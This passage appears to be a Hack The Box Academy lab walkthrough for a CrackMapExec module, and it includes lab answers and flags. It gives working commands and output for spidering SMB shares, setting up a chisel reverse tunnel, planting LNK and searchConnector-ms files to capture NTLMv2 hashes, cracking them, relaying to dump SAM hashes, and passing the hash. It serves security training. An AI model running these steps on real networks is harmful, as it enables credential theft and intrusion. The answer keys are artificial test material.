SPIDER_P... 10.129.15.169   445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 10.129.15.169   445    DC01             [*]       SIZE: 51200
SPIDER_P... 10.129.15.169   445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

Next, students need to look at the output that was saved to `/tmp/cme_spider_plus`:

Code: shell

```shell
cat /tmp/cme_spider_plus/10.129.15.169.json
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ cat /tmp/cme_spider_plus/10.129.15.169.json 
{
    "CertEnroll": {
        "DC01.inlanefreight.htb_inlanefreight-DC01-CA.crt": {
            "atime_epoch": "2022-11-23 14:21:46",
            "ctime_epoch": "2022-11-23 14:21:46",
            "mtime_epoch": "2022-11-23 14:21:46",
            "size": "905 Bytes"
        },
        "inlanefreight-DC01-CA+.crl": {
            "atime_epoch": "2023-01-06 19:01:44",
            "ctime_epoch": "2022-11-23 14:21:47",
            "mtime_epoch": "2023-01-06 19:01:44",
            "size": "751 Bytes"
        },
        "inlanefreight-DC01-CA.crl": {
            "atime_epoch": "2023-01-06 19:01:44",
            "ctime_epoch": "2022-11-23 14:21:47",
            "mtime_epoch": "2023-01-06 19:01:44",
            "size": "953 Bytes"
        },
        "nsrev_inlanefreight-DC01-CA.asp": {
            "atime_epoch": "2022-11-23 14:21:47",
            "ctime_epoch": "2022-11-23 14:21:47",
            "mtime_epoch": "2022-11-23 14:21:47",
            "size": "336 Bytes"
        }
    },
    "IT": {
        "Creds.txt": {
            "atime_epoch": "2022-10-31 15:16:17",
            "ctime_epoch": "2022-10-31 15:15:17",
            "mtime_epoch": "2022-12-01 13:01:22",
            "size": "54 Bytes"
        },
        "Documents/PCNames.txt": {
            "atime_epoch": "2022-11-01 13:02:58",
            "ctime_epoch": "2022-11-01 13:02:42",
            "mtime_epoch": "2022-12-01 13:01:22",
            "size": "22 Bytes"
        },
        "IPlist.txt": {
            "atime_epoch": "2022-10-31 15:15:11",
            "ctime_epoch": "2022-10-31 15:14:52",
            "mtime_epoch": "2022-12-01 13:01:22",
            "size": "36 Bytes"
        }
    },
    "Users": {
        "creds.txt": {
            "atime_epoch": "2022-12-01 11:48:33",
            "ctime_epoch": "2022-12-01 11:47:36",
            "mtime_epoch": "2022-12-01 13:05:45",
            "size": "9 Bytes"
        },
        "test/powershelltest.ps1": {
            "atime_epoch": "2022-12-01 12:09:32",
            "ctime_epoch": "2022-12-01 12:05:21",
            "mtime_epoch": "2022-12-01 13:05:45",
            "size": "216 Bytes"
        }
    },
    "linux01": {
        "Documents.searchConnector-ms": {
            "atime_epoch": "2022-11-22 12:11:55",
            "ctime_epoch": "2022-11-22 12:11:54",
            "mtime_epoch": "2022-11-22 12:11:55",
            "size": "518 Bytes"
        },
        "information-txt.csv": {
            "atime_epoch": "2022-10-31 19:00:58",
            "ctime_epoch": "2022-10-31 18:21:36",
            "mtime_epoch": "2022-11-21 19:17:18",
            "size": "284 Bytes"
        }
    }
}
```

The output reveals a `PowerShell` script in the `Users` share.

Answer: `Users`

# Spidering and Finding Juicy Information from an SMB Share

## Question 4

### "What is the password you found in the powershelltest.ps1 file?"

Students need to target smb, authenticating as `grace:Inlanefreight01!` while using the option to get a file from an smb share. Specifically the `powershelltest.ps1` file previously discovered:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! --share Users --get-file test/powershelltest.ps1 powershelltest.ps1
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.15.169 -u grace -p Inlanefreight01! --share Users --get-file test/powershelltest.ps1 powershelltest.ps1

SMB         10.129.15.169   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.15.169   445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         10.129.15.169   445    DC01             [*] Copy test/powershelltest.ps1 to powershelltest.ps1
SMB         10.129.15.169   445    DC01             [+] File test/powershelltest.ps1 was transferred to powershelltest.ps1
```

Using the `cat` command, students need to read the contents of the script:

Code: shell

```shell
cat powershelltest.ps1
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.122]─[htb-ac594497@htb-rk5ahe0mig]─[~/CrackMapExec]
└──╼ [★]$ cat powershelltest.ps1

$ptuser = 'INLANEFREIGHT\julio';
$ptpass = 'Password1';
$ptpassword =  ConvertTo-SecureString $ptpass -AsPlainText -Force;
$ptcredential = New-Object System.Management.Automation.PSCredential $ptuser, $ptpassword;(crackmapexec-py3.9)
```

There, they will find `Password1` in plain text.

Answer: `Password1`

# Proxychains with CME

## Question 1

### "Read the flag in the shared folder named flag, on server DC01 (172.16.1.10)"

Students need to first download `chisel` to the `Pwnbox` and run it as a server:

Code: shell

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q
gunzip -d chisel.gz 
./chisel server --reverse
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz -O chisel.gz -q

┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ gunzip -d chisel.gz 

┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ chmod +x chisel 

┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ ./chisel server --reverse

2023/01/09 17:01:14 server: Reverse tunnelling enabled
2023/01/09 17:01:14 server: Fingerprint AlzeNej5/0qCosJzmNKDa4Aa2DysJx6E5CHeH4+z3Qs=
2023/01/09 17:01:14 server: Listening on http://0.0.0.0:8080
```

Next, students need to download `chisel` for Windows and transfer it to the target machine:

Code: shell

```shell
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q
gunzip -d chisel.exe.gz 
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_windows_amd64.gz -O chisel.exe.gz -q

┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ gunzip -d chisel.exe.gz 
```

Students need to be conscious that they are within the Poetry Shell when using `CrackMapExec`, which can be used to transfer the chisel executable:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! --put-file ./chisel.exe '\\Windows\Temp\chisel.exe'
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.17.169 -u grace -p Inlanefreight01! --put-file ./chisel.exe '\\Windows\Temp\chisel.exe'

SMB         10.129.17.169   445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.17.169   445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB         10.129.17.169   445    MS01             [*] Copy ./chisel.exe to \\Windows\Temp\chisel.exe
SMB         10.129.17.169   445    MS01             [+] Created file ./chisel.exe on \\C$\\\Windows\Temp\chisel.exe
```

Now, students need to run `chisel` on the target machine, configuring the socks proxy:

Code: shell

```shell
crackmapexec smb STMIP -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.171:8080 R:socks"
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.17.169 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.171:8080 R:socks"

SMB         10.129.17.169   445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.17.169   445    MS01             [+] inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

If students check their `chisel` server, they should see an incoming connection:

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ ./chisel server --reverse

2023/01/09 17:17:18 server: Reverse tunnelling enabled
2023/01/09 17:17:18 server: Fingerprint IIfRy88izAuFTYyuFFhmB7CASBXRfrpYUW8i7p1BxYQ=
2023/01/09 17:17:18 server: Listening on http://0.0.0.0:8080
2023/01/09 17:20:29 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Additionally, students need to install the `proxychains4` binary which supports the "quiet" option:

Code: shell

```shell
sudo apt install proxychains4
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ sudo apt install proxychains4

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libproxychains4
The following NEW packages will be installed:
  libproxychains4 proxychains4
0 upgraded, 2 newly installed, 0 to remove and 233 not upgraded.
Need to get 33.4 kB of archives.
After this operation, 104 kB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 https://deb.parrot.sh/parrot parrot/main amd64 libproxychains4 amd64 4.14-3 [19.1 kB]
Get:2 https://deb.parrot.sh/parrot parrot/main amd64 proxychains4 amd64 4.14-3 [14.4 kB]
Fetched 33.4 kB in 0s (141 kB/s)        
Selecting previously unselected package libproxychains4:amd64.
(Reading database ... 554712 files and directories currently installed.)
Preparing to unpack .../libproxychains4_4.14-3_amd64.deb ...
Unpacking libproxychains4:amd64 (4.14-3) ...
Selecting previously unselected package proxychains4.
Preparing to unpack .../proxychains4_4.14-3_amd64.deb ...
Unpacking proxychains4 (4.14-3) ...
Setting up libproxychains4:amd64 (4.14-3) ...
Setting up proxychains4 (4.14-3) ...
update-alternatives: using /usr/bin/proxychains4 to provide /usr/bin/proxychains (proxychains) in auto mode
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for libc-bin (2.31-13+deb11u4) ...
Scanning application launchers
Removing duplicate launchers or broken launchers
Launchers are updated
```

`Proxychains4` must be configured to use port 1080 as a socks5 proxy:

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ sudo cat /etc/proxychains4.conf 

<SNIP>

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Subsequently, students need to use `proxychains4` with `CrackMapExec` to enumerate the shared folders and find the flag:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M spider_plus -o EXCLUDE_DIR=ADMIN$,IPC$,print$,NETLOGON,SYSVOL

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:135-<><>-OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SPIDER_P... 172.16.1.10     445    DC01             [*] Started spidering plus with option:
SPIDER_P... 172.16.1.10     445    DC01             [*]        DIR: ['admin$', 'ipc$', 'print$', 'netlogon', 'sysvol']
SPIDER_P... 172.16.1.10     445    DC01             [*]        EXT: ['ico', 'lnk']
SPIDER_P... 172.16.1.10     445    DC01             [*]       SIZE: 51200
SPIDER_P... 172.16.1.10     445    DC01             [*]     OUTPUT: /tmp/cme_spider_plus
```

The output of `CrackMapExec` reveals the location of the flag:

Code: shell

```shell
cd /tmp/cme_spider_plus/
ls
cat 172.16.1.10.json | jq
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ cd /tmp/cme_spider_plus/

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ ls

172.16.1.10.json

(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ cat 172.16.1.10.json | jq

{
  "HR": {},
  "IT-Tools": {},
  "flag": {
    "flag.txt": {
      "atime_epoch": "2022-12-03 10:29:27",
      "ctime_epoch": "2022-12-03 10:29:15",
      "mtime_epoch": "2022-12-03 10:29:56",
      "size": "23 Bytes"
    }
  }
}
```

Finally, students need to download the flag and read it:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --share flag --get-file flag.txt flag.txt
cat flag.txt
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --share flag --get-file flag.txt flag.txt

ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:135-<><>-OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [*] Copy flag.txt to flag.txt
SMB         172.16.1.10     445    DC01             [+] File flag.txt was transferred to flag.txt
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ cat flag.txt

U$ing_Pr0xyCh4ins_&_CME
```

Answer: `U$ing_Pr0xyCh4ins_&_CME`

# Stealing Hashes

## Question 1

### "Repeat the steps shown in this section to capture the julio user hash. Attempt to Crack julio's password with Hashcat. Submit the password as the answer."

Students first need to connect to the target machine's `chisel` server:

Code: shell

```shell
sudo chisel client STMIP:8080 socks
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ sudo chisel client 10.129.17.169:8080 socks

2023/01/09 17:43:16 client: Connecting to ws://10.129.17.169:8080
2023/01/09 17:43:16 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2023/01/09 17:43:17 client: Connected (Latency 89.044598ms)
```

Next, students must ensure that `Responder` is also running on their attack host:

Code: shell

```shell
sudo responder -I tun0
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ sudo responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

<SNIP>

[+] Listening for events...
```

The `slinky` module can now be used to save an LNK in the shared folders:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.171 NAME=important
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o SERVER=10.10.14.171 NAME=important

ProxyChains-3.1 (http://proxychains.sf.net)
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:135-<><>-OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: HR
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the HR share
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
SLINKY      172.16.1.10     445    DC01             [+] Created LNK file on the IT-Tools share
```

After a few minutes, students should see an NTLM relay in their `Responder`:

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.17.169
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash     : julio::INLANEFREIGHT:4c25f230ed3c31e3:AD6EE0622BBDF87277873E5875D8D673:010100000000000080A4C95B5224D901494FD0C5665E9E410000000002000800530056004C00330001001E00570049004E002D0046004F0055004B004A0056003700370042003700470004003400570049004E002D0046004F0055004B004A005600370037004200370047002E00530056004C0033002E004C004F00430041004C0003001400530056004C0033002E004C004F00430041004C0005001400530056004C0033002E004C004F00430041004C000700080080A4C95B5224D901060004000200000008003000300000000000000000000000003000002BDA98BDB60DBEFDB5817DBBFF6B29F18D3E1AAF199D86FDC07C431481BBFF780A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100370031000000000000000000
[*] Skipping previously captured hash for INLANEFREIGHT\julio
```

Students need to copy the hash to a text file and then crack it with `Hashcat`:

Code: shell

```shell
hashcat -m 5600 julio.hash /usr/share/wordlists/rockyou.txt 
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ hashcat -m 5600 julio.hash /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

JULIO::INLANEFREIGHT:4c25f230ed3c31e3:ad6ee0622bbdf87277873e5875d8d673:010100000000000080a4c95b5224d901494fd0c5665e9e410000000002000800530056004c00330001001e00570049004e002d0046004f0055004b004a0056003700370042003700470004003400570049004e002d0046004f0055004b004a005600370037004200370047002e00530056004c0033002e004c004f00430041004c0003001400530056004c0033002e004c004f00430041004c0005001400530056004c0033002e004c004f00430041004c000700080080a4c95b5224d901060004000200000008003000300000000000000000000000003000002bda98bdb60dbefdb5817dbbff6b29f18d3e1aaf199d86fdc07c431481bbff780a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100370031000000000000000000:Password1
```

After cracking the hash, the plain text password is shown to be `Password1`.

Answer: `Password1`

# Stealing Hashes

## Question 2

### "Clean the LNK file. Make DONE when finished."

Students need to clean the LNK file:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=yes
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M slinky -o NAME=important CLEANUP=yes

ProxyChains-3.1 (http://proxychains.sf.net)
[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:135-<><>-OK
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.10:445-<><>-OK
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: HR
SLINKY      172.16.1.10     445    DC01             [+] Deleted LNK file on the HR share
SLINKY      172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
SLINKY      172.16.1.10     445    DC01             [+] Deleted LNK file on the IT-Tools share
```

Once completed, students need to type `DONE`.

Answer: `DONE`

# Stealing Hashes

## Question 3

### "Use CrackMapExec to create an LNK or .searchConnector-ms file in the shares and try to relay the NTLMv2 hash to 172.16.1.5. Use the Administrator hash to connect to 172.16.1.5 and submit the contents of the flag in c:\\relay\\flag.txt as the answer."

Students first need to run `ntlmrelayx.py`, preparing for the internal 172.16.1.5 machine to do an NTLM relay:

```
sudo proxychains4 -q impacket-ntlmrelayx -t 172.16.1.5 -smb2support --no-http
```

```
┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[~/CrackMapExec]
└──╼ [★]$ sudo proxychains4 -q impacket-ntlmrelayx -t 172.16.1.5 -smb2support --no-http

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```

Next, students need to create the `.searchConnector-ms` file and place it on the target:

Code: shell

```shell
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\PWNIP\\secret FILENAME=secret
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! -M drop-sc -o URL=\\\\10.10.14.171\\secret FILENAME=secret

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\grace:Inlanefreight01! 
DROP-SC     172.16.1.10     445    DC01             [+] Found writable share: HR
DROP-SC     172.16.1.10     445    DC01             [+] Created secret.searchConnector-ms file on the HR share
DROP-SC     172.16.1.10     445    DC01             [+] Found writable share: IT-Tools
DROP-SC     172.16.1.10     445    DC01             [+] Created secret.searchConnector-ms file on the IT-Tools share
```

After a few minutes, students need to check the terminal that was running `ntlmrelayx.py`:

```
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-3: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, attacking target smb://172.16.1.5
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.1.5:445-<><>-OK
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-3: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] SMBD-Thread-5: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] SMBD-Thread-6: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] SMBD-Thread-7: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] SMBD-Thread-8: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] SMBD-Thread-9: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] SMBD-Thread-10: Connection from INLANEFREIGHT/JULIO@10.129.204.178 controlled, but there are no more targets left!
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

Finally, students need to pass the hash to authenticate as the local administrator and read the flag:

Code: shell

```shell
crackmapexec smb STMIP -u Administrator -H 30b3783ce2abf1af70f77d0660cf3453 -x "more C:\relay\flag.txt" --local-auth
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.14.171]─[htb-ac594497@htb-roqunvif7y]─[/tmp/cme_spider_plus]
└──╼ [★]$ crackmapexec smb 10.129.204.178 -u Administrator -H 30b3783ce2abf1af70f77d0660cf3453 -x "more C:\relay\flag.txt" --local-auth

SMB         10.129.204.178  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB         10.129.204.178  445    MS01             [+] MS01\Administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
SMB         10.129.204.178  445    MS01             [+] Executed command 
SMB         10.129.204.178  445    MS01             R3l4y1nG_Is_Fun
```

The flag reads `R3l4y1nG_Is_Fun`.

Answer: `R3l4y1nG_Is_Fun`

# Mapping and Enumeration with SMB

## Question 1

### "Which service account other than julio and svc\_workstations appears as logged-on in the target machine?"

Students need authenticate as `robert:Inlanefreight01!` and enumerate SMB with the `--loggedon-users` option:

Code: shell

```shell
crackmapexec smb STMIP -u robert -p Inlanefreight01! --loggedon-users
```

```
(crackmapexec-py3.9) ┌─[us-academy-1]─[10.10.15.68]─[htb-ac594497@htb-9dtagelt38]─[~/CrackMapExec]
└──╼ [★]$ crackmapexec smb 10.129.204.177 -u robert -p Inlanefreight01! --loggedon-users

SMB         10.129.204.177  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.204.177  445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         10.129.204.177  445    DC01             [+] Enumerated loggedon users
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\svc_mssql                 logon_server: DC01
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\david                     logon_server: DC01
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\svc_workstations          logon_server: DC01
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\julio                     logon_server: DC01
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\julio                     logon_server: DC01
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$                     
SMB         10.129.204.177  445    DC01             INLANEFREIGHT\DC01$      
```

The other service account is shown to be `svc_mssql`.

Answer: `svc_mssql`

# Mapping and Enumeration with SMB

## Question 2

### "Enumerate all computers and identify the one missing in the section example. Submit the computer name as the answer (include the symbol $)."

Students need authenticate as `robert:Inlanefreight01!` and target smb, enumerating computers with the `--computers` option:

Code: shell

```shell
